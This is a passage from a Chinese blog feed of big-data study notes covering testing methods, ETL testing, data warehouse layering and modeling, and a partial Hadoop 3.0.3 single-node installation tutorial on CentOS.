<h2 id="大数据商业产品"><a href="#大数据商业产品" class="headerlink" title="大数据商业产品"></a>大数据商业产品</h2><ul>
<li>大数据解决方案提供商</li>
<li>大数据云计算服务商</li>
<li>大数据SaaS服务商</li>
<li>大数据开发平台</li>
</ul>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>第七章 大数据测试方法</title>
    <url>/aposts/549ce9d8/</url>
    <content><![CDATA[<h2 id="与传统测试区别"><a href="#与传统测试区别" class="headerlink" title="与传统测试区别"></a>与传统测试区别</h2><p><img src="/aposts/549ce9d8/image-20211231104504478.png" alt="image-20211231104504478"></p>
<h2 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h2><h3 id="数据质量"><a href="#数据质量" class="headerlink" title="数据质量"></a>数据质量</h3><ul>
<li>主要包括4种测试方法</li>
</ul>
<p><img src="/aposts/549ce9d8/image-20211231104800758.png" alt="image-20211231104800758"></p>
<h3 id="常用的功能测试方法"><a href="#常用的功能测试方法" class="headerlink" title="常用的功能测试方法"></a>常用的功能测试方法</h3><h4 id="数据约束检查"><a href="#数据约束检查" class="headerlink" title="数据约束检查"></a>数据约束检查</h4><ul>
<li>如数据类型、长度、索引、主键等是否符合要求</li>
</ul>
<h4 id="数据存储检查"><a href="#数据存储检查" class="headerlink" title="数据存储检查"></a>数据存储检查</h4><ul>
<li>是否需要压缩文件形式存储</li>
<li>hive表类型是否合理（内外部表、分区、分桶表）</li>
<li>代码中读取、写入文件目录是否正确</li>
</ul>
<h4 id="SQL文件检查"><a href="#SQL文件检查" class="headerlink" title="SQL文件检查"></a>SQL文件检查</h4><p>开发规范检查。一般公司都有自己的规范，如hiveql中的：</p>
<ul>
<li>注释</li>
<li>字段，不行用*代替全部</li>
<li>…..</li>
</ul>
<h4 id="SQ语法检查"><a href="#SQ语法检查" class="headerlink" title="SQ语法检查"></a>SQ语法检查</h4><ul>
<li>合理使用insert into、insert overwrite、order by、group by等</li>
</ul>
<h4 id="数据处理逻辑验证"><a href="#数据处理逻辑验证" class="headerlink" title="数据处理逻辑验证"></a>数据处理逻辑验证</h4><ul>
<li>脏数据处理是否符合预期</li>
<li>去重处理</li>
</ul>
<h4 id="shell脚本测试"><a href="#shell脚本测试" class="headerlink" title="shell脚本测试"></a>shell脚本测试</h4><ul>
<li>测试jar包是否引用正确</li>
<li>mapper、reducer文件、mapreduce依赖文件等路径、运行配置参数是否合理</li>
<li>我对shell不熟悉，一般采用python</li>
</ul>
<h4 id="调度任务测试"><a href="#调度任务测试" class="headerlink" title="调度任务测试"></a>调度任务测试</h4><ul>
<li>是否支持重跑</li>
<li>依赖层次是否合理</li>
<li>任务是否在规定时间完成等</li>
</ul>
<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>主要由六种测试：基准测试、并发测试、负载测试、压力测试、容量测试、稳定性测试</p>
<h3 id="性能测试步骤"><a href="#性能测试步骤" class="headerlink" title="性能测试步骤"></a>性能测试步骤</h3><p><img src="/aposts/549ce9d8/image-20211231111135709.png" alt="image-20211231111135709"></p>
<h3 id="性能测试案例"><a href="#性能测试案例" class="headerlink" title="性能测试案例"></a>性能测试案例</h3><ul>
<li><p>以<a href="https://moon-full.gitee.io/2021/12/29/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/#%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E6%A1%88%E4%BE%8B">第六章用户行为分析平台</a>为例子，采用YCSB工具，对平台底层Kudu进行性能测试</p>
</li>
<li><p>YCSB 是雅虎开源的性能测试工具，对NoSql产品进行测试和评估，如HBase、MongoDB等</p>
</li>
</ul>
<h4 id="测试场景"><a href="#测试场景" class="headerlink" title="测试场景"></a>测试场景</h4><p><img src="/aposts/549ce9d8/image-20211231152400144.png" alt="image-20211231152400144"></p>
<h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/aposts/549ce9d8/image-20211231152443995.png" alt="image-20211231152443995"></p>
<p><img src="/aposts/549ce9d8/image-20211231153058203.png" alt="image-20211231153058203"></p>
<h2 id="大数据基准测试"><a href="#大数据基准测试" class="headerlink" title="大数据基准测试"></a>大数据基准测试</h2><p>对大数据框架、大数据平台、工具的出现进行基准测试，测试步骤分为：</p>
<ul>
<li><p>数据准备</p>
</li>
<li><p>负载选择</p>
</li>
</ul>
<p><img src="/aposts/549ce9d8/image-20211231153711579.png" alt="image-20211231153711579"></p>
<ul>
<li>指标度量</li>
</ul>
<h3 id="基准测试工具"><a href="#基准测试工具" class="headerlink" title="基准测试工具"></a>基准测试工具</h3><p><img src="/aposts/549ce9d8/image-20211231153834017.png" alt="image-20211231153834017"></p>
<h2 id="大数据ETL测试"><a href="#大数据ETL测试" class="headerlink" title="大数据ETL测试"></a>大数据ETL测试</h2><h3 id="ETL测试类型"><a href="#ETL测试类型" class="headerlink" title="ETL测试类型"></a>ETL测试类型</h3><h4 id="元数据测试"><a href="#元数据测试" class="headerlink" title="元数据测试"></a>元数据测试</h4><ul>
<li>验证表定义是否符号数据模型和应用程序的设计规范，包括对数据类型、数据长度、索引和约束等</li>
</ul>
<h4 id="数据完整性测试"><a href="#数据完整性测试" class="headerlink" title="数据完整性测试"></a>数据完整性测试</h4><ul>
<li>目的是验证是否已将预期数据从源加载到目标中，主要测试：比较源和目标之间的计数，如最大、最小、总和、均值和实际数据量</li>
</ul>
<h4 id="数据转换测试"><a href="#数据转换测试" class="headerlink" title="数据转换测试"></a>数据转换测试</h4><ul>
<li>白盒测试。用sql或pl&#x2F;sql对数据转换，用转换后的数据与目标中数据比较</li>
<li>黑盒测试。外部界面方式造数据完成转换，用转换后的数据与目标中数据比较</li>
</ul>
<h4 id="增量ETL测试"><a href="#增量ETL测试" class="headerlink" title="增量ETL测试"></a>增量ETL测试</h4><p>目的是验证源上的更新能否正确加载到目标系统中</p>
<h3 id="ETL集成测试"><a href="#ETL集成测试" class="headerlink" title="ETL集成测试"></a>ETL集成测试</h3><p>如下几个步骤：</p>
<ul>
<li>在源系统中，设置测试数据</li>
<li>执行ETL过程把数据加载到目标中</li>
<li>查看或处理目标系统中数据</li>
<li>验证数据和使用该数据的应用程序的功能</li>
</ul>
<h4 id="ETL性能测试"><a href="#ETL性能测试" class="headerlink" title="ETL性能测试"></a>ETL性能测试</h4><p>略</p>
<h3 id="ETL测试场景"><a href="#ETL测试场景" class="headerlink" title="ETL测试场景"></a>ETL测试场景</h3><h4 id="实时数据ETL和测试"><a href="#实时数据ETL和测试" class="headerlink" title="实时数据ETL和测试"></a>实时数据ETL和测试</h4><ul>
<li>实时数据一般指分钟级别以下，通常包括实时计算、存储、展示和分析等。</li>
</ul>
<p><img src="/aposts/549ce9d8/image-20211231161902589.png" alt="image-20211231161902589"></p>
<ul>
<li>原始数据:可以理解为上游原始数据。对于整个上层消费应用，除数据本身以外，其他都是“黑盒，即不可见。目前，对于接入的数据源，常见的提供数据的方式人 Kafka、MQ 等。</li>
<li>实时数据处理:这是整个数据流转路径的核心，负责根据业务需求对原始数据进行理并转发。常见的处理实时数据的应用框架有Flink、Storm和SparkStreaming等。</li>
<li>数据存储:用于保存处理后的数据。对于业务功能，可以在这里获取需要使用的数据。在这里，我们一般使用基于内存的key-value数据库 Redis，以及列式数据医。 ClickHouse、MongoDB和HDFS等。另外，我们可以将数据转发至另一个数握 通道。</li>
<li>数据应用:数据的具体使用。在这里，我们可以对数据进行业务层面的处理、数据的可视化展示。</li>
</ul>
<h4 id="离线数据ETL和测试"><a href="#离线数据ETL和测试" class="headerlink" title="离线数据ETL和测试"></a>离线数据ETL和测试</h4><ul>
<li>离线数据一般采用T+1模式，即每天凌晨处理前一天的数据，一般采用Sqoop，datax，Flume和MapReduce等</li>
</ul>
<p><img src="/aposts/549ce9d8/image-20211231163101257.png" alt="image-20211231163101257"></p>
<ul>
<li>对于不同的数据仓库结构，有不同的测试点</li>
</ul>
<p><img src="/aposts/549ce9d8/image-20211231163336807.png" alt="image-20211231163336807"></p>
<h4 id="大数据ETL测试工具"><a href="#大数据ETL测试工具" class="headerlink" title="大数据ETL测试工具"></a>大数据ETL测试工具</h4><ul>
<li>iCDQ</li>
<li>Talend</li>
</ul>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>第二章 数据仓的设计与构建</title>
    <url>/aposts/8ae2490c/</url>
    <content><![CDATA[<h2 id="什么是数据仓"><a href="#什么是数据仓" class="headerlink" title="什么是数据仓"></a>什么是数据仓</h2><ul>
<li><p>是BI（商业智能）、报表和数据挖掘等应用的基础</p>
</li>
<li><p>大量的数据集合，4个特点主要包括：<strong>面向主题的、集成的、相对稳定的、反应历史变化的</strong></p>
</li>
<li><p>数据仓至少需要具备<strong>数据获取、数据存储、数据访问</strong>3个核心功能，这3个功能的实现过程是数据源到最终决策应用的流转过程。下图为数据流转图：</p>
</li>
</ul>
<p><img src="/aposts/8ae2490c/image-20211201171618652.png" alt="image-20211201171618652"></p>
<ul>
<li><p>数据获取和数据存储这两个功能主要由ETL工具支撑。ETL是指从<strong>数据源提前，经过清洗、转换</strong>等过程，并最终存储到目标数据仓库的过程。如下图所示，ETL过程3个步骤</p>
<p><img src="/aposts/8ae2490c/image-20211201172008951.png" alt="image-20211201172008951"></p>
</li>
<li><p><a href="https://zhuanlan.zhihu.com/p/337994072">为什么要用ETL</a></p>
</li>
</ul>
<h2 id="数据仓库、集市、数据湖、中台区别"><a href="#数据仓库、集市、数据湖、中台区别" class="headerlink" title="数据仓库、集市、数据湖、中台区别"></a>数据仓库、集市、数据湖、中台区别</h2><h3 id="数据集市"><a href="#数据集市" class="headerlink" title="数据集市"></a>数据集市</h3><ul>
<li><p>数据仓库面向企业全局业务，而数据集市面向部门级业务</p>
<p><img src="/aposts/8ae2490c/image-20211206151311207.png" alt="image-20211206151311207"></p>
</li>
</ul>
<h3 id="数据湖"><a href="#数据湖" class="headerlink" title="数据湖"></a>数据湖</h3><ul>
<li><p>数据存储结构：数据仓主要存储和处理历史数据的机构化数据，而数据湖能存储结构和非结构化所有格式的数据</p>
</li>
<li><p>数据转换处理：数据仓库需要对源数据进行清洗、转换等预处理，以和定义好的数据模型相吻合；而数据湖是从源数据导入，无数据流失，随去随用，只有在使用的时候对数据转换等处理</p>
</li>
<li><p>数据场景：数据仓通常充当商业智能系统、数据仪表盘等可视化报表服务的数据源角色，支持历史分析；数据湖可以作为数据仓库或数据集市的数据源，更适合进行数据的挖掘、探索和预测，</p>
</li>
</ul>
<h3 id="数据中台"><a href="#数据中台" class="headerlink" title="数据中台"></a>数据中台</h3><ul>
<li>由阿里巴巴提出，就是用大数据技术统一处理数据，然后提供API给外部使用，数据中台保护数据仓库和其他服务器中间件</li>
</ul>
<h2 id="数据仓库的设计"><a href="#数据仓库的设计" class="headerlink" title="数据仓库的设计"></a>数据仓库的设计</h2><h3 id="架构分层设计"><a href="#架构分层设计" class="headerlink" title="架构分层设计"></a><span id="架构分层设计">架构分层设计</span></h3><ul>
<li>数据仓库通常可分为数据接入层、数据明细层、数据汇总层、数据集市层、数据应用层、临时层和公共维度层。其中数据明细层和数据汇总层又合称为数据仓库层。</li>
</ul>
<p><img src="/aposts/8ae2490c/image-20211206154539189.png" alt="image-20211206154539189"></p>
<h4 id="数据接入层ODS"><a href="#数据接入层ODS" class="headerlink" title="数据接入层ODS"></a>数据接入层ODS</h4><ul>
<li>（Operational Data Store，ODS），也称数据贴源层，通常从业务数据库直接导入，为了考虑后续可能需要追溯数据问题，因此对于这一层就不建议做过多的数据清洗工作，原封不动地接入原始数据即可，至于数据的去噪、去重、异常值处理等过程可以放在后面的DWD层来做</li>
</ul>
<h4 id="数据明细层DWD"><a href="#数据明细层DWD" class="headerlink" title="数据明细层DWD"></a>数据明细层DWD</h4><ul>
<li>(Data Warehouse Detail，DWD) ，这层和 ODS 层保持一样的数据结构，只不过在从 ODS 里抽取到 DWD 的时候这个过程叫 ETL，后面我们会再讲 ETL，在抽取时对数据进行清洗加工，提供一定的数据质量保证，提供更干净的数据。</li>
</ul>
<h4 id="数据汇总层DWS"><a href="#数据汇总层DWS" class="headerlink" title="数据汇总层DWS"></a>数据汇总层DWS</h4><ul>
<li>（Data Warehouse Summary, DWS），对各个表进行JOIN操作，产生业务所需要的完整数据。该层主要存放明细事实宽表、聚合试试宽表等。</li>
</ul>
<h4 id="数据集市层DWM"><a href="#数据集市层DWM" class="headerlink" title="数据集市层DWM"></a>数据集市层DWM</h4><ul>
<li>也叫数据中间件，(Data Warehouse Middle,DWM)，该层是在DWD层的数据基础上，对数据做一些轻微的聚合操作，生成一些列的中间结果表，提升公共指标的复用性，减少重复加工的工作。</li>
<li>简答来说，对通用的核心维度进行聚合操作，算出相应的统计指标</li>
<li>从广度来说，它包含了所有的业务数据</li>
</ul>
<h4 id="数据应用层"><a href="#数据应用层" class="headerlink" title="数据应用层"></a>数据应用层</h4><ul>
<li>该层中，数据高度汇总，数据粒度较大，但不一定涵盖所有业务数据，也可能只是数据集市层数据的一个子集。</li>
<li>该层主要是提供给数据产品和数据分析使用的数据，一般会存放在ES、Redis、PostgreSql等系统中供线上系统使用；也可能存放在hive或者Druid中，供数据分析和数据挖掘使用，比如常用的数据报表就是存在这里的</li>
</ul>
<h4 id="临时层TMP"><a href="#临时层TMP" class="headerlink" title="临时层TMP"></a>临时层TMP</h4><ul>
<li>临时存放一些中间数据计算结果</li>
</ul>
<h4 id="公共维度层"><a href="#公共维度层" class="headerlink" title="公共维度层"></a>公共维度层</h4><ul>
<li>主要负责一些一致性维度建设，如地点区域表、时间维度表等，数据仓库的各层均可使用此层</li>
</ul>
<h3 id="数据仓库建模方法"><a href="#数据仓库建模方法" class="headerlink" title="数据仓库建模方法"></a><span id="数据仓库建模方法">数据仓库建模方法</span></h3><ul>
<li>主要有范式建模、维度建模、实体建模</li>
</ul>
<h4 id="范式建模"><a href="#范式建模" class="headerlink" title="范式建模"></a>范式建模</h4><p>是数据仓库逻辑模型设计的基本理论，在数据仓库的模型设计中，一般采用第三范式。一个符合第三范式的关系必须具有以下三个条件:</p>
<ul>
<li>每个属性的值唯一,不具有多义性;</li>
<li>每个非主属性必须完全依赖于整个主键,而非主键的一部分;</li>
<li>每个非主属性不能依赖于其他关系中的属性,因为这样的话,这种属性应该归到其他关系中去</li>
</ul>
<h4 id="维度建模"><a href="#维度建模" class="headerlink" title="维度建模"></a>维度建模</h4><ul>
<li><p>是经典的面向分析的数据仓库建模方法。对数据进行分析时使用的度量。例如：抽取近10年的信用卡数据，分析年申请趋势</p>
</li>
<li><p>经常出现实体表、维度表和事实表等</p>
<ul>
<li>实体表，用于存放商品的属性信息</li>
<li>维度表，按照某个分析维度来组织的事实描述，如分析某商品近半年来每月下单量，则表中一定存在时间字段属性。</li>
<li>事实表，<strong>是维度表各个维度的交点</strong>，如某商品在某地某月的销售额</li>
</ul>
</li>
<li><p>在维度建模的基础上又分为三种模型：星型模型、雪花模型、星座模型。</p>
</li>
</ul>
<h5 id="星型模式"><a href="#星型模式" class="headerlink" title="星型模式"></a>星型模式</h5><p><img src="/aposts/8ae2490c/image-20211206163244801.png" alt="image-20211206163244801"></p>
<h5 id="雪花模式"><a href="#雪花模式" class="headerlink" title="雪花模式"></a>雪花模式</h5><p><img src="/aposts/8ae2490c/image-20211206163338893.png" alt="image-20211206163338893"></p>
<ul>
<li>星型模型和雪花模型实例</li>
</ul>
<p><img src="/aposts/8ae2490c/image-20211206163931436.png" alt="image-20211206163931436"></p>
<h5 id="星座模式"><a href="#星座模式" class="headerlink" title="星座模式"></a>星座模式</h5><p>星座模式是星型模式延伸而来，星型模式是基于一张事实表的，而星座模式是基于多张事实表的，而且共享维度信息。</p>
<p><img src="/aposts/8ae2490c/image-20211206163425140.png" alt="image-20211206163425140"></p>
<ul>
<li>星座模型与前两种情况的区别是事实表的数量,星座模型是基于多个事实表。</li>
<li>基本上是很多数据仓库的常态,因为很多数据仓库都是多个事实表的。所以星座不星座只反映是否有多个事实表,他们之间<br>是否共享一些维度表。所以星座模型并不和前两个模型冲突。</li>
</ul>
<h5 id="模型的选择"><a href="#模型的选择" class="headerlink" title="模型的选择"></a>模型的选择</h5><ul>
<li>首先就是星座不星座这个只跟数据和需求有关系,跟殳计没关系,不用选择。星型还是雪花,取决于性能优先,还是灵活更优先。</li>
<li>目前实际企业开发中,不会绝对选择一种,根据情况灵活组合,甚至并存(一层维度和多层维度都保存)</li>
<li>但是整体来看,更倾向于维度更少的星型模型。尤其是hadoop体系,减少Join就是减少 Shuffle,性能差距很大。(关系型数据可以依靠强大的主键索引)</li>
</ul>
<h4 id="实体建模"><a href="#实体建模" class="headerlink" title="实体建模"></a>实体建模</h4><p>在数据仓建模中不常见，一般适用与业务建模和领域概念建模阶段</p>
<h2 id="数据仓库构建"><a href="#数据仓库构建" class="headerlink" title="数据仓库构建"></a>数据仓库构建</h2><h3 id="数据仓库的构建方法"><a href="#数据仓库的构建方法" class="headerlink" title="数据仓库的构建方法"></a>数据仓库的构建方法</h3><ul>
<li>构建方法主要包括自顶向下和自底向上</li>
</ul>
<h4 id="自顶向下实现"><a href="#自顶向下实现" class="headerlink" title="自顶向下实现"></a>自顶向下实现</h4><ul>
<li>自顶向下的实现需要在项目开始时完成更多计划和设计工作，这就需要涉及参与数据仓库实现的每个工作组、部门或业务线中的人员。要使 用的数据源、安全性、数据结构、数据质量、数据标准和整个数据模型的有关决策一般需要在真正的实现开始之前就完成。</li>
<li>此构建方法，实施周期长，难道略大</li>
</ul>
<h4 id="自底向上实现"><a href="#自底向上实现" class="headerlink" title="自底向上实现"></a>自底向上实现</h4><ul>
<li>自底向上的实现包含数据仓库的规划和设计，无需等待安置好更大业务范围的数据仓库设计。这并不意味着不会开发更大业务范围的数据仓 库设计；随着初始数据仓库实现的扩展，将逐渐增加对它的构建。现在，该方法得到了比自顶向下方法更广泛的接受，因为数据仓库的直接结果可以实现， 并可以用作扩展更大业务范围实现的证明。</li>
</ul>
<h4 id="两者结合"><a href="#两者结合" class="headerlink" title="两者结合"></a>两者结合</h4><ul>
<li>两者结合的折中实现：每种实现方法都有利弊。在许多情况下，最好的方法可能是某两种的组合。该方法的关键之一就是确定业务范围的架构需要用于支持 集成的计划和设计的程度，因为数据仓库是用自底向上的方法进行构建。在使用自底向上或阶段性数据仓库项目模型来构建业务范围架构中的一系列数据集 市时，您可以一个接一个地集成不同业务主题领域中的数据集市，从而形成设计良好的业务数据仓库。这样的方法可以极好地适用于业务。在这种方法中， 可以把数据集市理解为整个数据仓库系统的逻辑子集，换句话说数据仓库就是一致化了的数据集市的集合。</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>无论采用哪种模式，数据仓库构建过程，都可以参考下图介绍的5个步骤。基于BI报表、数据挖掘等应用要求，可参考<a href="#%E6%9E%B6%E6%9E%84%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1">架构分层设计</a>数据仓库结构进行适当的分层设计，并根据业务要求选择合适的建模方法，可参考<a href="#%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93%E5%BB%BA%E6%A8%A1%E6%96%B9%E6%B3%95">数据仓库建模方法</a></p>
<p><img src="/aposts/8ae2490c/image-20211206171202539.png" alt="image-20211206171202539"></p>
<h3 id="数据仓库实例"><a href="#数据仓库实例" class="headerlink" title="数据仓库实例"></a>数据仓库实例</h3><ul>
<li><a href="http://dblab.xmu.edu.cn/blog/959/">大数据案例-步骤一:本地数据集上传到数据仓库Hive</a></li>
</ul>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>第三章 大数据之Hadoop搭建</title>
    <url>/aposts/d7dcf086/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>服务器信息，是腾讯云服务器，2核cpu，4GB内存，80GB云硬盘，系统为centos 7.6_x64</li>
</ul>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Hadoop是用来处理大数据集合的分布式存储计算基础架构。可以使用一种简单的编程模式，通过多台计算机构成的集群，分布式处理大数据集。hadoop作为底层，其生态环境很丰富。hadoop基础包括以下四个基本模块：</p>
<ul>
<li>hadoop基础功能库：支持其他hadoop模块的通用程序包。</li>
<li>HDFS: 一个分布式文件系统，能够以高吞吐量访问应用的数据。</li>
<li>YARN: 一个作业调度和资源管理框架。</li>
<li>MapReduce: 一个基于YARN的大数据并行处理程序。</li>
</ul>
<h2 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h2><h3 id="创建hadoop用户"><a href="#创建hadoop用户" class="headerlink" title="创建hadoop用户"></a>创建hadoop用户</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su              <span class="comment">#  root 用户登录</span></span><br><span class="line">useradd -m hadoop -s /bin/bash   <span class="comment"># 创建新用户hadoop,并使用 /bin/bash 作为shell</span></span><br><span class="line">passwd hadoop <span class="comment"># 设置密码</span></span><br></pre></td></tr></table></figure>

<h4 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h4><ul>
<li><p>为 hadoop 用户增加管理员权限，方便部署，避免一些对新手来说比较棘手的权限问题，输入命令<code>visudo</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos hadoop]$ sudo visudo</span><br><span class="line">[sudo] password for hadoop:</span><br></pre></td></tr></table></figure>


</li>
<li><p>找到 <code>root ALL=(ALL) ALL</code> 这行，然后在这行下面增加一行内容：<code>hadoop ALL=(ALL) ALL</code> （当中的间隔为tab），如下图所示：</p>
<p><img src="/aposts/d7dcf086/image-20211207093705705.png" alt="image-20211207093705705"></p>
</li>
<li><p><code>su hadoop</code> 直接可以切换用户</p>
</li>
</ul>
<h3 id="安装SSH、配置SSH无密码登陆"><a href="#安装SSH、配置SSH无密码登陆" class="headerlink" title="安装SSH、配置SSH无密码登陆"></a>安装SSH、配置SSH无密码登陆</h3><ul>
<li><p>集群、单节点模式都需要用到 SSH 登陆（类似于远程登陆，你可以登录某台 Linux 主机，并且在上面运行命令），一般情况下，CentOS 默认已安装了 SSH client、SSH server，打开终端执行如下命令进行检验：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos /]$ rpm -qa | grep ssh</span><br><span class="line">openssh-7.4p1-21.el7.x86_64</span><br><span class="line">openssh-clients-7.4p1-21.el7.x86_64</span><br><span class="line">openssh-server-7.4p1-21.el7.x86_64</span><br><span class="line">libssh2-1.8.0-4.el7.x86_64</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>包含了 SSH client 跟 SSH server，则不需要再安装</li>
</ul>
</li>
<li><p>接着执行如下命令(<code>ssh localhost</code>)测试一下 SSH 是否可用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[hadoop@VM-24-13-centos /]$ ssh localhost</span><br><span class="line">The authenticity of host <span class="string">&#x27;localhost (::1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:v9LOJv5al8BNRGGZVJeqa2AdV3znIsa6cjyoj9CbWRQ.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is MD5:bd:51:9d:6f:1f:9c:1f:ad:34:ce:fb:90:4f:27:bc:b1.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>此时会有如下提示(SSH首次登陆提示)，输入 yes 。然后按提示输入密码 hadoop，这样就登陆到本机了，类似于下面这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added <span class="string">&#x27;localhost&#x27;</span> (ECDSA) to the list of known hosts.</span><br><span class="line">hadoop@localhost<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Last login: Tue Dec  7 09:37:37 2021</span></span><br><span class="line"><span class="string">[hadoop@VM-24-13-centos ~]$</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>但这样登陆是需要每次输入密码的，我们需要配置成SSH无密码登陆比较方便。</p>
</li>
<li><p>首先输入 <code>exit</code> 退出刚才的 ssh，就回到了我们原先的终端窗口，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[hadoop@VM-24-13-centos ~]$ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">logout</span></span><br><span class="line">Connection to localhost closed.</span><br><span class="line">[hadoop@VM-24-13-centos /]$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>然后利用 ssh-keygen 生成密钥，并将密钥加入到授权中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh/                     <span class="comment"># 若没有该目录，请先执行一次ssh localhost</span></span><br><span class="line">ssh-keygen -t rsa              <span class="comment"># 会有提示，都按回车就可以</span></span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub &gt;&gt; authorized_keys  <span class="comment"># 加入授权</span></span><br><span class="line"><span class="built_in">chmod</span> 600 ./authorized_keys    <span class="comment"># 修改文件权限</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>~的含义</strong></p>
<p>在 Linux 系统中，~ 代表的是用户的主文件夹，即 “&#x2F;home&#x2F;用户名” 这个目录，如你的用户名为 hadoop，则 ~ 就代表 “&#x2F;home&#x2F;hadoop&#x2F;”。 此外，命令中的 # 后面的文字是注释。</p>
</blockquote>
</li>
<li><p>此时再用 <code>ssh localhost</code> 命令，无需输入密码就可以直接登陆了，如下所示。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hadoop@VM-24-13-centos .ssh]$ ssh localhost</span><br><span class="line">Last login: Tue Dec  7 09:44:00 2021 from ::1</span><br><span class="line">[hadoop@VM-24-13-centos ~]$</span><br></pre></td></tr></table></figure>

<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><ul>
<li><p>java之前已经装好了，为1.8</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[hadoop@VM-24-13-centos ~]$ java -version</span><br><span class="line">java version <span class="string">&quot;1.8.0_311&quot;</span></span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_311-b11)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.311-b11, mixed mode)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="安装hadoop"><a href="#安装hadoop" class="headerlink" title="安装hadoop"></a>安装hadoop</h3><ul>
<li>安装hadoop版本为3.0</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su root</span><br><span class="line"><span class="built_in">cd</span> /usr/local</span><br><span class="line">wget https://archive.apache.org/dist/hadoop/common/hadoop-3.0.3/hadoop-3.0.3.tar.gz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[hadoop@VM-24-13-centos <span class="built_in">local</span>]$ sudo tar zxvf hadoop-3.0.3.tar.gz</span><br><span class="line"><span class="built_in">cd</span> /usr/local/</span><br><span class="line">sudo <span class="built_in">mv</span> ./hadoop-3.0.3/ ./hadoop            <span class="comment"># 将文件夹名改为hadoop</span></span><br><span class="line">sudo <span class="built_in">chown</span> -R hadoop:hadoop ./hadoop        <span class="comment"># 修改文件权限</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>Hadoop 解压后即可使用。输入如下命令来检查 Hadoop 是否可用，成功则会显示 Hadoop 版本信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/hadoop</span><br><span class="line">./bin/hadoop version</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ ./bin/hadoop version</span><br><span class="line">Hadoop 3.0.3</span><br><span class="line">Source code repository https://yjzhangal@git-wip-us.apache.org/repos/asf/hadoop.git -r 37fd7d752db73d984dc31e0cdfd590d252f5e075</span><br><span class="line">Compiled by yzhang on 2018-05-31T17:12Z</span><br><span class="line">Compiled with protoc 2.5.0</span><br><span class="line">From <span class="built_in">source</span> with checksum 736cdcefa911261ad56d2d120bf1fa</span><br><span class="line">This <span class="built_in">command</span> was run using /usr/local/hadoop/share/hadoop/common/hadoop-common-3.0.3.jar</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Hadoop单机配置-非分布式"><a href="#Hadoop单机配置-非分布式" class="headerlink" title="Hadoop单机配置(非分布式)"></a>Hadoop单机配置(非分布式)</h2><ul>
<li>Hadoop 默认模式为非分布式模式，无需进行其他配置即可运行。非分布式即单 Java 进程，方便进行调试。</li>
<li><strong>这里比较奇怪，安装原文中教程，示例已经验证通过了，当搭建了伪分布式配置时，第二天运行这里的实例，没有成功？然后把实例修改后，发现居然和伪分布式配置代码差不多？暂不做深究了</strong></li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul>
